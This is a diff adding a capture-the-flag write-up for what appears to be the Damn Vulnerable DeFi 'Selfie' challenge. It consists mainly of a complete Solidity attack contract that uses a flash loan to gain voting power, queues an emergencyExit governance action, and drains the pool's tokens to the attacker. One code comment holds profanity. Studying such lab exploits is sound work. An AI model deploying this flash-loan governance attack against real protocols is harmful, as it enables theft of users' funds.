@@ -135,3 +135,61 @@ contract TheRewardAttack {
     }
 }
 ```
+
+## Challenge6
+
+This challenge is similar to the previous one.Firstly we use flashloan borrow some DVT token.Secondly we use the DVT token make a governance action.Finally two days later we make a executeAction to claim the DVT token to our attack contact and send it to our player.Here goes the entire code:
+
+```javascript
+pragma solidity ^0.8.0;
+
+import "./SimpleGovernance.sol";
+import "./SelfiePool.sol";
+import "../DamnValuableTokenSnapshot.sol";
+import "hardhat/console.sol";
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract SelfieAttack is IERC3156FlashBorrower {
+
+    SelfiePool private immutable pool;
+    SimpleGovernance private immutable governance;
+    DamnValuableTokenSnapshot private immutable token;
+
+    constructor(SelfiePool _pool,SimpleGovernance _governance,DamnValuableTokenSnapshot _token) {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+    }
+
+    function onFlashLoan(address initiator,address _token,uint256 amount,uint256 fee,bytes calldata _data) external returns (bytes32){
+        //receive DVT token from pool
+        console.log("receive token:",DamnValuableTokenSnapshot(_token).balanceOf(address(this)));
+
+        //make a snapshot ?
+        DamnValuableTokenSnapshot(_token).snapshot();
+
+        //submit an governance action
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)",address(this));
+
+        governance.queueAction(address(pool),0,data);
+
+        //approve DVT token to lending pool.
+        DamnValuableTokenSnapshot(_token).approve(address(pool),amount);
+
+        //return success bytes
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function exeAction(uint256 actionId) external {
+        //execute the action
+        governance.executeAction(actionId);
+        //send token to mother fuck sender please
+        DamnValuableTokenSnapshot(token).transfer(msg.sender,DamnValuableTokenSnapshot(token).balanceOf(address(this)));
+    }
+
+    function attack(uint256 borrowAmount) external {
+        //make a DVT token flashloan
+        pool.flashLoan(IERC3156FlashBorrower(this),address(token),borrowAmount,'0x');
+    }
+}
+```
